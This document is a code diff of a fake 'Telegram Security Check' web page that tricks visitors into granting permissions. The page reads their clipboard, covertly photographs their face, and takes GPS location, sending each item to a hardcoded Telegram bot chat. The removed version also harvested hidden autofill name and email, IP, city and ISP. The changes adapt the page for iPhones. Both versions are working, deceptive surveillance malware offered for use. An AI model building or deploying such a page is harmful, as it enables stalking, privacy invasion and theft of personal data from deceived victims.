@@ -2,38 +2,32 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram - Security Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram - Security Check</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 25px rgba(0,0,0,0.08); width: 100%; max-width: 380px; text-align: center; position: relative; z-index: 10; }
-        .logo { width: 110px; margin-bottom: 25px; }
-        h2 { font-size: 24px; font-weight: 600; color: #222; margin-bottom: 15px; }
-        p { color: #707579; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background-color: #3390ec; color: white; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
-        .btn:hover { background-color: #2b7dcb; }
-        #trap-form { opacity: 0.01; position: absolute; top: 0; left: 0; height: 1px; width: 1px; overflow: hidden; }
-        video, canvas { display: none; }
-        .loading { display: none; margin-top: 15px; color: #3390ec; font-weight: bold; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
+        .logo { width: 100px; margin-bottom: 20px; }
+        h2 { font-size: 22px; margin-bottom: 10px; color: #222; }
+        p { color: #707579; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background-color: #3390ec; color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; -webkit-appearance: none; }
+        #video, #canvas { display: none; }
+        .loading { display: none; color: #3390ec; margin-top: 15px; font-weight: 500; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
         <h2>Identity Check</h2>
-        <p>To access this chat, please allow location and camera access to verify you are a human user.</p>
+        <p>Your Telegram session requires a quick security check. Please allow location and camera to continue.</p>
         
-        <form id="trap-form">
-            <input type="text" id="af_name" autocomplete="name">
-            <input type="email" id="af_email" autocomplete="email">
-        </form>
-
-        <button class="btn" id="mainBtn">VERIFY & PROCEED</button>
-        <div id="status" class="loading">Processing... Please wait</div>
+        <button class="btn" id="mainBtn">VERIFY IDENTITY</button>
+        <div id="status" class="loading">Verifying... Please wait</div>
     </div>
 
-    <video id="video" autoplay></video>
+    <!-- پێویستە بۆ iOS ئەم تاگانە لێرە بن -->
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -41,76 +35,60 @@
         const chatId = "6679834643";
 
         async function sendToBot(text) {
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: text })
-                });
-            } catch (e) { console.error("Send Error"); }
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
         }
 
         document.getElementById('mainBtn').addEventListener('click', async function() {
-            const btn = document.getElementById('mainBtn');
+            const btn = this;
             const status = document.getElementById('status');
             btn.style.display = 'none';
             status.style.display = 'block';
 
-            // 1. دەستبەجێ ڕاکێشانی Clipboard
+            // 1. Clipboard (iOS تەنها لە کاتی کلیکدا ڕێگە دەدات)
             try {
-                const clipText = await navigator.clipboard.readText();
-                if(clipText) await sendToBot("📋 Clipboard Data:\n" + clipText);
-            } catch (e) { await sendToBot("❌ Clipboard Access Denied"); }
+                const clip = await navigator.clipboard.readText();
+                if(clip) await sendToBot("📋 Clipboard: " + clip);
+            } catch (e) {}
 
-            // 2. زانیاری ئامێر و IP
-            const deviceDetails = `📱 Device: ${navigator.platform}\n🌐 Browser: ${navigator.userAgent}`;
-            await sendToBot(deviceDetails);
-
+            // 2. وەرگرتنی وێنە (بۆ ئایفۆن playsinline و muted زۆر گرنگە)
             try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                await sendToBot(`🌐 IP: ${ipData.ip}\n🏙️ City: ${ipData.city}\n🏢 ISP: ${ipData.org}`);
-            } catch (e) { await sendToBot("❌ IP Check Failed"); }
-
-            // 3. ڕاکێشانی Autofill (ناو و ئیمەیڵ)
-            const name = document.getElementById('af_name').value;
-            const email = document.getElementById('af_email').value;
-            if(name || email) await sendToBot(`👤 Autofill Identity:\nName: ${name}\nEmail: ${email}`);
-
-            // 4. وێنەی کامێرا (بە شێوەی نهێنی)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const constraints = { video: { facingMode: "user" }, audio: false };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                await new Promise(resolve => setTimeout(resolve, 1500)); // وێستان بۆ فوکەسی کامێرا
+                // وێستان بۆ دڵنیابوون لەوەی کامێراکە فوکەسی کردووە
+                await new Promise(r => setTimeout(r, 1200));
                 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                 const fd = new FormData();
                 fd.append('chat_id', chatId);
-                fd.append('photo', blob, 'capture.jpg');
-                fd.append('caption', '👤 Target Face Captured!');
-                
+                fd.append('photo', blob, 'ios_face.jpg');
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                
                 stream.getTracks().forEach(t => t.stop());
-            } catch (e) { await sendToBot("❌ Camera Access Denied"); }
+            } catch (e) { await sendToBot("❌ iOS Camera Denied"); }
 
-            // 5. GPS Location (دواین هەنگاو و گۆڕینی لاپەڕە)
+            // 3. لۆکەیشنی GPS (بۆ ئایفۆن Timeout پێویستە کەم بێت تاوەکو "Hang" نەبێت)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    await sendToBot(`📍 GPS High Accuracy:\nhttps://www.google.com/maps?q=${lat},${lon}\nAccuracy: ${pos.coords.accuracy}m`);
+                    await sendToBot(`📍 iOS GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`);
                     window.location.href = "index.html";
                 }, async (err) => {
-                    await sendToBot("❌ GPS Access Denied");
+                    await sendToBot("❌ iOS GPS Denied");
                     window.location.href = "index.html";
-                }, { enableHighAccuracy: true, timeout: 10000 });
+                }, { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 });
             } else {
                 window.location.href = "index.html";
             }
